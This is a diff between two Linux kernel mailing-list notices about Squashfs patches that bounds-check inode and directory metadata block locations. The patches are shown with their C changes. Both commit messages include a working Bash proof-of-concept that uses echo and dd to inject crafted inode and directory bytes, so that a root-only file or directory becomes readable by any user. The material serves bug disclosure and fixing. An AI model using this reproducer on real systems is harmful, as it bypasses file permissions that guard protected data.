@@ -1,49 +1,49 @@
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1795407248;
-	b=FtkpcP0QeQq1fiJk/pm0XvKGNlv+STi+FaiicPXN5afk0XSsZv1vFNvkCyALDdHKn5Gy
-	 aQ//eP3SOnhlteyQyKBUyF0EObEkPeX2+tzINL9Glmo0JVfjGEdkv5/qYRCRLG0StEVNY
-	 WyYRXav1mGAQGAfVO15VktWZDlwf4btY+j59q0Nk8vxZPEH/QraN2ZRtb7voiHBKXKKwj
-	 UEC1Ewar4g65a1fkOin+ieB2qWuMppFgH9KhaoTM/Xza0Y8ZBxb9BlsJ+iog1letuCvpb
-	 9R3w19bTM5WCKR/jSAqbyOBPvtBhnAOY0JR6IUtWgMyYLZlpnOar6Cmz6QxUmdBuAcg==
+	t=1795407252;
+	b=qadNr5jtIxLUiw4iY7uhJwLAzAsvMZYWLe7AkxM2zN6vPcOuYEzxrVzpFlivrs8sHVOG
+	 fb2MiUdLeVoNkr7DNEsWNaFowp58asTQfdbNe6ADXjwo3FbjUkmH400sjbpXda9JlOU81
+	 bhaslxXcay8mbw7ty0yzK8U29nuz9UTmNbMiKY85P69iF45DQC5tGtCasObD2K1gdxoDL
+	 LhBL8zR41HgCZHhank7F1AE0YwyWP8KAW+EWLQPf3Bqgy6Ppb2AwSMAwsfNgsRMsMpdmP
+	 OO6aDL7I051PUllZMooTDKT4Y0wknOpN9FNAr2cchXWj4C373QBU8IS3On3YtIdNbog==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795407248;
+	a=rsa-sha256; c=relaxed/relaxed; t=1795407252;
 	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
 	 Message-Id;
-	bh=YHfOjfeu9VjpmefLymKhWNU9Wx3cWGTzuddH32PL9Q0=;
-	b=zVIdg1tEC0fg5RSAtqLtCQFRlB+MzqA1tdpN0azjNGJwA1g8UnWSU80HTgflBIivS75E
-	 waUJ4eTvwMGMsMso5A4ZB6SDl8n/FKEfE5k2Mvt1h5HktnYEn0J547HoB5nFCOcAvhSAC
-	 x4KZ/NDX3VCokMG/s8sd82Z5BdIRoTifEylqLGE3HNG23Re4CW9dxIZ/Dn7QJWPZtNGpR
-	 3Ka2v46CZ9r6KGpIDkCFwsoRz52Otq69joPY95P9SN7wUMTtjjdzx4ACeLIGqvnColAST
-	 k5KG9K+u64gReXOA0/TbqNAeioSnHXwCjmJEEX4OUppbT7FUA0xgYIZqnk9Soj7yeqg==
+	bh=2BjG6hJDBRnix8X8QJe9NtDqt7zhYvVWcZyp4ejUryw=;
+	b=bkz1MbEhfSFIXBzLQFbcmkfg1sz/MAqHET3FhiZoLNupChi3kioydcbefX3PC8Op0F7R
+	 pUjKC1dzbRFiEXa8PYuOIsJ4VqBVVBDqvkH4hu56xk1Du2eMrDyb6Mvb5HGi/JVPYVv6i
+	 gRuZisyIykqZyiYhKpIi+wrTpk1VQB6p+OWr/O+5VgjFyRHjTh7sAZu5khzK2veNSRTaW
+	 ksv1pGwuFEU6LrhDN8+W1jOvE4HPFcYmnz9BoLO0cTqDqwTngoFtFWIrTSkIYpquer1VO
+	 lZYAIWCpHGdj8OomgZVk0/Zceh0BHkPMtdVFnBg9ULMlr9ErCg/twWM4LyVd3CMY2bA==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=OqLrnypD;
+	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=Y12wVd0S;
 	arc=none smtp.remote-ip=100.103.45.18
 Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A330C606A327
-	for <mm-commits@vger.kernel.org>; Mon, 23 Nov 2026 04:14:08 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E7BC6606A320
+	for <mm-commits@vger.kernel.org>; Mon, 23 Nov 2026 04:14:11 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=OqLrnypD
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 5BDBF1F000C4;
-	Mon, 23 Nov 2026 04:14:08 +0000 (UTC)
+	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=Y12wVd0S
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 601F11F000CA;
+	Mon, 23 Nov 2026 04:14:11 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-	d=linux-foundation.org; s=korg; t=1795407248;
-	bh=YHfOjfeu9VjpmefLymKhWNU9Wx3cWGTzuddH32PL9Q0=;
+	d=linux-foundation.org; s=korg; t=1795407251;
+	bh=2BjG6hJDBRnix8X8QJe9NtDqt7zhYvVWcZyp4ejUryw=;
 	h=Date:To:From:In-Reply-To:References:Subject;
-	b=OqLrnypDuV7VANTOUGtTe6P8frNxhBa6xESzN7O8cewOziqwIPVKo9FLIaDdMCydf
-	 7PTqRoLKkDRs/scAYy1OWS9GH3CoIcC0wbWDM+9UDhcgCS08//g8nVn0sAb+8ConxB
-	 RWU2amUtUDMBdQRGCJbY/bBptxguV6HkFooZrwFM=
-Date: Sun, 22 Nov 2026 20:14:07 -0800
+	b=Y12wVd0SaOWr8ULdzCYI1bOdMBLZY6P7i6ln4b6mn8LMe1jV/qrn+X95fuyjIXh6G
+	 0tAQe0jvCtQGsCpIIMhD7Lp1rof8bRUL/Lp4stEoLI2S5ssMqVau1qZ2XYrcAHSRCU
+	 Er/VtJsWHEu8QPSF9AJahtfx9VaBM8MD3TaGbc+o=
+Date: Sun, 22 Nov 2026 20:14:10 -0800
 To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
 	akpm@linux-foundation.org
 From: Andrew Morton <akpm@linux-foundation.org>
-In-Reply-To: <20261123034304.261742-12-phillip@squashfs.org.uk>
-References: <20261123034304.261742-12-phillip@squashfs.org.uk>
-Subject: + squashfs-sanity-check-inode-metadata-block-location.patch added to mm-nonmm-unstable branch
-Message-Id: <20261123041408.5BDBF1F000C4@smtp.kernel.org>
+In-Reply-To: <20261123034304.261742-13-phillip@squashfs.org.uk>
+References: <20261123034304.261742-13-phillip@squashfs.org.uk>
+Subject: + squashfs-sanity-check-directory-metadata-block-location.patch added to mm-nonmm-unstable branch
+Message-Id: <20261123041411.601F11F000CA@smtp.kernel.org>
 X-Mailing-List: mm-commits@vger.kernel.org
 List-Id: <mm-commits.vger.kernel.org>
 List-Post: <mailto:mm-commits@vger.kernel.org>
@@ -55,12 +55,12 @@ Precedence: list
 
 
 The patch titled
-     Subject: Squashfs: sanity check inode metadata block location
+     Subject: Squashfs: sanity check directory metadata block location
 has been added to the -mm mm-nonmm-unstable branch.  Its filename is
-     squashfs-sanity-check-inode-metadata-block-location.patch
+     squashfs-sanity-check-directory-metadata-block-location.patch
 
 This patch will shortly appear at
-     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-sanity-check-inode-metadata-block-location.patch
+     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-sanity-check-directory-metadata-block-location.patch
 
 This patch will later appear in the mm-nonmm-unstable branch at
     git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
@@ -79,57 +79,58 @@ and is updated there most days
 
 ------------------------------------------------------
 From: Phillip Lougher <phillip@squashfs.org.uk>
-Subject: Squashfs: sanity check inode metadata block location
-Date: Mon, 23 Nov 2026 03:42:52 +0000
+Subject: Squashfs: sanity check directory metadata block location
+Date: Mon, 23 Nov 2026 03:42:53 +0000
 
-An inode reference in Squashfs is represented as a tuple, the location
-of the compressed metadata block the inode is in, and the offset into
-the uncompressed block.  The location is not absolute and it is instead
-encoded as an offset from the start of the inode table.
+The contents of directories are stored in compressed metadata blocks,
+which are placed in the directory table.  The location of a directory
+is thus represented as a tuple, the location of the compressed metadata
+block that the directory is in, and the offset into the uncompressed
+block.  The block location is not absolute, and it is instead encoded
+as an offset from the start of the directory table.
 
-An attacker could manipulate the inode reference to make it point to a
-replacement malicious inode stored elsewhere, outside the inode table.
-This is because the code does not check that the location is valid and
-is within the inode table.
+An attacker could manipulate the directory block location to make it
+point to a replacement malicious directory stored elsewhere, outside
+the directory table.  This is because the code does not check that the
+location is valid and is within the directory table.
 
 In practice this exploit is hard to achieve because metadata in Squashfs
 is compressed by default, and so the compressed metadata cannot be
 directly altered.  In addition due to sanity checking at mount time
-there are no gaps in the filesystem to hide a malicious inode.
+there are no gaps in the filesystem to store a malicious directory.
 
-Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
+Also anyone with access to Mksquashfs/Unsquashfs can copy and recreate
 the filesystem incorporating whatever changes they want.
 
-However there are a number of exploit scenarios here.  Many embedded
-systems or secure systems have deliberately restricted installations
+However, there are a number of exploit scenarios here.  Many embedded
+systems or secure systems have deliverately restricted installations
 with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
 due to this bug can be achieved with only echo and dd.
 
-An example exploit is where a Squashfs filesystem root directory has
-permissions 0700 (u=rxw), where only the superuser can enter the
-directory and access the content within. But using this bug an attacker
-could place a malicious root inode in the inode lookup table (used by
-NFS) which has the permissions changed to 0777 (a=rwx), and then update
-the root_inode field in the superblock to point to that.  On
-reboot/remount this will make the directory accesisible to unprivileged
-users.
+An example exploit is where a Squashfs filesystem has a file in the
+root directory with permissions 0700 (u=rxw), where only the superuser
+can read it.  But using this bug an attacker could create a malicious
+replacement directory in the inode lookup table (used by NFS), that
+points to a malicious replacement inode that has the permissions
+changed to 0777 (a=wrx).  On reboot/remount this would make the
+file readable by unprivileged users.
 
 The following shell script acts as a reproducer and proof of concept.
 
 This commit blocks such attempts by adding a new helper
-squashfs_inode_start() which adds additional sanity checking, first
+squashfs_dir_start() which adds additional sanity checking, first
 ensuring no arithmetic operations overflow, and second checking that
-the inode is within the inode table.
+the directory is within the directory table.
 
 Reproducer
 ==========
 
 The following Bash script uses echo and dd to achieve the previously
-discussed exploit.  If the exploit is successful the root directory
-permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
-is unchanged.
+discussed exploit.  If the exploit is successful the file "data"
+permissions will be changed to 0777 (a=rwx), but otherwise the
+filesystem is unchanged.
 
-======================================================================
+===================================================================
 #!/bin/bash
 
 ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"
@@ -148,46 +149,80 @@ pushd $DIR 2>&1 > /dev/null
 echo Create a Squashfs pseudo file which is fed to Mksquashfs
 
 dd if=/dev/zero of=zero bs=1024 count=1 status=none
+echo "data f 0700 0 0 echo some data" >> pseudo
+echo "files d 0777 0 0" >> pseudo
 for i in $(seq 1 100); do
-	echo "$i l zero" >> pseudo
+	echo "files/$i f 0655 1000 1000 cat zero" >> pseudo
 done
 
-# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
-echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"
+# Create a Squashfs filesystem
+echo "Create a Squashfs filesystem"
 
-if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
+if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0777 0 0" $ARGS; then
 	echo Failed to create Squashfs filesystem
 	finish
 fi
 
-# The root_inode field in the superblock points to the compressed metadata
-# block and offset within it, where the root inode is stored.
+# Exploit: The file named "data" has permissions 0700, which can only be
+# read by the superuser.  The desire is to change the permissions on
+# the file to be 0777, which can be read by unprivileged users.
 #
-# Create a malicious root inode and hide it in the inode lookup table.
-# Because of mount time checking, there are no gaps between metadata tables
-# where it can be hidden, and it can't be hidden after the file system end,
-# because this is checked.
-
-# Write malicious inode, this is the same as the original root inode, except
-# it is uncompressed, and the permissions are set to 0777.
-/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
-\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
-\x00" > file
-
-# Place new root inode inside the inode lookup table
-echo Place new root inode inside the inode lookup table
-
-dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none
-
-# Update the root_inode field in the superblock to point to our new inode
-# The start block is an offset from the inode_table_start, and not an
-# absolute value.  The start of the inode table is 113, the new inode
-# is placed at position 964, and so the offset is 851. Because we've only
-# stored one inode in the metadata block, the offset into that block is 0.
+# Due to compression of the metadata, this cannot be done by directly
+# writing to the metadata tables.  Instead the real metadata is replaced
+# by malicious metadata starting from the "data" file inode upwards to
+# the root inode.
 #
-echo Update the root_inode field in the superblock to point to our new inode
+# This is a three step process.
+#
+# 1. A new "data" file inode is placed within the inode lookup table
+# 2. A new root directory which points to the new "data" file inode is
+#    placed in the inode lookup table
+# 3. A new root inode which pounts to the new root directory table is
+#    placed in the inode lookup table.
+#
+# For brevity this reproducer uses pre-computed data for the above.
 
-/usr/bin/echo -en "\x00\x00\x4f\x03" > file
+# Write malicious inode for file "data", this is the same as the
+# original except it is uncompressed, and the permissions are set to
+# 0777.
+echo Writing malicious inode for file \"data\"
+
+/usr/bin/echo -en "\x20\x80\x02\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
+\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x0A\x00\x00\x00" > file
+
+dd bs=1 seek=1034 if=file of=img.sqsh count=34 conv=notrunc status=none
+
+# Write directory data which points to the malicious inode
+echo Writing root directory which points to malicious inode
+
+/usr/bin/echo -en "\x31\x80\x00\x00\x00\x00\x90\x03\x00\x00\x01\x00\x00\
+\x00\x00\x00\x00\x00\x02\x00\x03\x00\x64\x61\x74\x61\x00\x00\x00\x00\
+\x00\x00\x00\x00\x02\x00\x00\x00\xA0\x0C\x00\x00\x01\x00\x04\x00\x66\
+\x69\x6c\x65\x73" > file
+
+dd bs=1 seek=983 if=file of=img.sqsh count=51 conv=notrunc status=none
+
+#
+# Write root inode, this is the same as the original root inode, except
+# it is uncompressed, and it points to the new directory data
+echo Writing root inode which points to the new root directory
+
+/usr/bin/echo -en "\x20\x80\x01\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
+\x00\x00\x67\x00\x00\x00\x43\x02\x00\x00\x03\x00\x00\x00\x34\x00\x00\
+\x00\x00\x00\x00\x00" > file
+
+dd bs=1 seek=949 if=file of=img.sqsh count=34 conv=notrunc status=none
+
+# Update the root_inode field in the superblock to point to our new
+# root inode.  The start block is an offset from the inode_table_start,
+# and not an absolute value.  The start of the inode table is 122, the
+# new inode is placed at position 949, and so the offset is 827. Because
+# we've only stored one inode in the metadata block, the offset into
+# that block is 0.
+echo Updating the root_inode field in the superblock
+
+/usr/bin/echo -en "\x00\x00\x3B\x03" > file
 
 dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none
 
@@ -199,18 +234,19 @@ if ! mount -t squashfs img.sqsh /mnt; then
 	finish
 fi
 
-# Stat /mnt, if the exploit is successful, permissions should be 0777
-echo Stat /mnt, if the exploit is successful, permissions should be 0777
+# Stat /mnt/data, if the exploit is successful, permissions should be 0777
+echo "************************************************************************"
+echo Stat /mnt/data, if the exploit is successful, permissions should be 0777
 
-stat /mnt
+stat /mnt/data
 
 popd 2>&1> /dev/null
 
 rm -rf $DIR
-======================================================================
+=====================================================================
 
-Link: https://patch.msgid.link/20261123034304.261742-12-phillip@squashfs.org.uk
-Fixes: 6545b246a2c8 (" Squashfs: inode operations")
+Link: https://patch.msgid.link/20261123034304.261742-13-phillip@squashfs.org.uk
+Fixes: c88da2c97936 ("Squashfs: directory lookup operations")
 Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
 Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
 Cc: Christian Loehle <christian.loehle@arm.com>
@@ -218,87 +254,179 @@ Cc: Dan Carpenter <error27@gmail.com>
 Cc: Phillip Lougher <phillip.lougher@gmail.com>
 Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>
 
- fs/squashfs/inode.c            |   17 ++++++++++-------
- fs/squashfs/squashfs_helpers.h |   18 ++++++++++++++++++
- 2 files changed, 28 insertions(+), 7 deletions(-)
+ fs/squashfs/dir.c              |   19 +++++++++++++------
+ fs/squashfs/namei.c            |   16 +++++++++++-----
+ fs/squashfs/squashfs_fs_sb.h   |    1 +
+ fs/squashfs/squashfs_helpers.h |   16 ++++++++++++++++
+ fs/squashfs/super.c            |    1 +
+ 5 files changed, 42 insertions(+), 11 deletions(-)
 
---- a/fs/squashfs/inode.c~squashfs-sanity-check-inode-metadata-block-location
-+++ a/fs/squashfs/inode.c
-@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *in
+--- a/fs/squashfs/dir.c~squashfs-sanity-check-directory-metadata-block-location
++++ a/fs/squashfs/dir.c
+@@ -22,6 +22,7 @@
+ #include "squashfs_fs.h"
+ #include "squashfs_fs_sb.h"
+ #include "squashfs_fs_i.h"
++#include "squashfs_helpers.h"
+ #include "squashfs.h"
+ 
+ static const unsigned char squashfs_filetype_table[] = {
+@@ -41,6 +42,7 @@ static int get_dir_index_using_offset(st
+ 	int i_count, u64 f_pos)
  {
- 	struct super_block *sb = inode->i_sb;
  	struct squashfs_sb_info *msblk = sb->s_fs_info;
--	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
--	int offset = squashfs_inode_offset(ino);
-+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
-+	int offset = squashfs_inode_offset(ino), soffset = offset;
- 	int err, type;
- 	union squashfs_inode squashfs_ino;
- 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
-@@ -118,11 +118,14 @@ int squashfs_read_inode(struct inode *in
++	s64 res;
+ 	int err, i, index, length = 0;
+ 	unsigned int size;
+ 	struct squashfs_dir_index dir_index;
+@@ -81,9 +83,12 @@ static int get_dir_index_using_offset(st
+ 		if (err < 0)
+ 			break;
  
- 	TRACE("Entered squashfs_read_inode\n");
++		res = squashfs_dir_start(le32_to_cpu(dir_index.start_block), msblk);
++		if (res < 0)
++			break;
++
+ 		length = index;
+-		*next_block = le32_to_cpu(dir_index.start_block) +
+-					msblk->directory_table;
++		*next_block = res;
+ 	}
  
+ 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
+@@ -99,11 +104,11 @@ static int squashfs_readdir(struct file
+ {
+ 	struct inode *inode = file_inode(file);
+ 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
+-	u64 block;
++	s64 block;
+ 	int offset, length, err;
+ 	unsigned int inode_number, dir_count, size, type;
+ 	struct squashfs_dir_header dirh;
+-	struct squashfs_dir_entry *dire;
++	struct squashfs_dir_entry *dire = NULL;
+ 
+ 	TRACE("Entered squashfs_readdir [%llx:%x]\n", squashfs_i(inode)->start,
+ 			squashfs_i(inode)->offset);
+@@ -141,15 +146,17 @@ static int squashfs_readdir(struct file
+ 		/* The directory is empty, nothing more to do */
+ 		goto finish;
+ 
++	block = squashfs_dir_start(squashfs_i(inode)->start, msblk);
 +	if (block < 0)
-+		goto bad_block_val;
++		goto failed_read;
 +
- 	/*
- 	 * Read inode base common to all inode types.
- 	 */
--	err = squashfs_read_metadata(sb, sqshb_ino, &block,
--				&offset, sizeof(*sqshb_ino));
-+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
-+				&soffset, sizeof(*sqshb_ino));
- 	if (err < 0)
- 		goto failed_read;
+ 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
+ 	if (dire == NULL) {
+ 		ERROR("Failed to allocate squashfs_dir_entry\n");
+ 		goto finish;
+ 	}
  
-@@ -130,9 +133,6 @@ int squashfs_read_inode(struct inode *in
- 	if (err)
- 		goto failed_read;
- 
--	block = squashfs_inode_blk(ino) + msblk->inode_table;
--	offset = squashfs_inode_offset(ino);
+-	block = squashfs_i(inode)->start + msblk->directory_table;
+ 	offset = squashfs_i(inode)->offset;
 -
- 	type = le16_to_cpu(sqshb_ino->inode_type);
- 	switch (type) {
- 	case SQUASHFS_REG_TYPE: {
-@@ -464,6 +464,9 @@ int squashfs_read_inode(struct inode *in
+ 	length = get_dir_index_using_offset(inode->i_sb, &block, &offset,
+ 				squashfs_i(inode)->dir_idx_start,
+ 				squashfs_i(inode)->dir_idx_offset,
+--- a/fs/squashfs/namei.c~squashfs-sanity-check-directory-metadata-block-location
++++ a/fs/squashfs/namei.c
+@@ -66,6 +66,7 @@ static int get_dir_index_using_name(stru
+ 			int index_offset, int i_count, const char *name)
+ {
+ 	struct squashfs_sb_info *msblk = sb->s_fs_info;
++	s64 res;
+ 	int i, length = 0, err;
+ 	unsigned int size;
+ 	struct squashfs_dir_index *index;
+@@ -102,9 +103,12 @@ static int get_dir_index_using_name(stru
+ 		if (strcmp(index->name, name) > 0)
+ 			break;
  
- 	return 0;
- 
-+bad_block_val:
-+	err = block;
++		res = squashfs_dir_start(le32_to_cpu(index->start_block), msblk);
++		if (res < 0)
++			break;
 +
- failed_read:
- 	ERROR("Unable to read inode 0x%llx\n", ino);
- 	return err;
---- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-inode-metadata-block-location
+ 		length = le32_to_cpu(index->index);
+-		*next_block = le32_to_cpu(index->start_block) +
+-					msblk->directory_table;
++		*next_block = res;
+ 	}
+ 
+ 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
+@@ -130,7 +134,7 @@ static struct dentry *squashfs_lookup(st
+ 	struct squashfs_sb_info *msblk = dir->i_sb->s_fs_info;
+ 	struct squashfs_dir_header dirh;
+ 	struct squashfs_dir_entry *dire = NULL;
+-	u64 block;
++	s64 block;
+ 	int offset, err, length;
+ 	unsigned int dir_count, size;
+ 
+@@ -144,15 +148,17 @@ static struct dentry *squashfs_lookup(st
+ 		/* The directory is empty, and so there's nothing to do */
+ 		goto exit_lookup;
+ 
++	block = squashfs_dir_start(squashfs_i(dir)->start, msblk);
++	if (block < 0)
++		goto data_error;
++
+ 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
+ 	if (dire == NULL) {
+ 		ERROR("Failed to allocate squashfs_dir_entry\n");
+ 		return ERR_PTR(-ENOMEM);
+ 	}
+ 
+-	block = squashfs_i(dir)->start + msblk->directory_table;
+ 	offset = squashfs_i(dir)->offset;
+-
+ 	length = get_dir_index_using_name(dir->i_sb, &block, &offset,
+ 				squashfs_i(dir)->dir_idx_start,
+ 				squashfs_i(dir)->dir_idx_offset,
+--- a/fs/squashfs/squashfs_fs_sb.h~squashfs-sanity-check-directory-metadata-block-location
++++ a/fs/squashfs/squashfs_fs_sb.h
+@@ -67,6 +67,7 @@ struct squashfs_sb_info {
+ 	__le64					*inode_lookup_table;
+ 	u64					inode_table;
+ 	u64					directory_table;
++	u64					directory_table_end;
+ 	u64					xattr_table;
+ 	unsigned int				block_size;
+ 	unsigned short				block_log;
+--- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-directory-metadata-block-location
 +++ a/fs/squashfs/squashfs_helpers.h
-@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(
- 	return inode & 0xffff;
+@@ -70,6 +70,22 @@ static inline s64 squashfs_mkinode(u32 s
+ 	return ((s64)start << 16) | offset;
  }
  
-+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
++/* directory helper functions */
++static inline s64 squashfs_dir_start(u32 blk, struct squashfs_sb_info *msblk)
 +{
 +	s64 start;
 +
-+	if (inode < 0)
++	if (S64_MAX - msblk->directory_table < blk)
 +		return -EINVAL;
 +
-+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
-+		return -EINVAL;
++	start = msblk->directory_table + blk;
 +
-+	start = msblk->inode_table + squashfs_inode_blk(inode);
-+
-+	if (start >= msblk->directory_table)
++	if (start >= msblk->directory_table_end)
 +		return -EINVAL;
 +
 +	return start;
 +}
 +
- static inline s64 squashfs_mkinode(u32 start, u16 offset)
+ /* fragment and fragment table defines */
+ static inline s64 squashfs_fragment_bytes(u32 fragments)
  {
- 	return ((s64)start << 16) | offset;
+--- a/fs/squashfs/super.c~squashfs-sanity-check-directory-metadata-block-location
++++ a/fs/squashfs/super.c
+@@ -437,6 +437,7 @@ check_directory_table:
+ 		err = -EINVAL;
+ 		goto insanity;
+ 	}
++	msblk->directory_table_end = next_table;
+ 
+ 	/* Sanity check inode_table */
+ 	if (msblk->inode_table >= msblk->directory_table) {
 _
 
 Patches currently in -mm which might be from phillip@squashfs.org.uk are
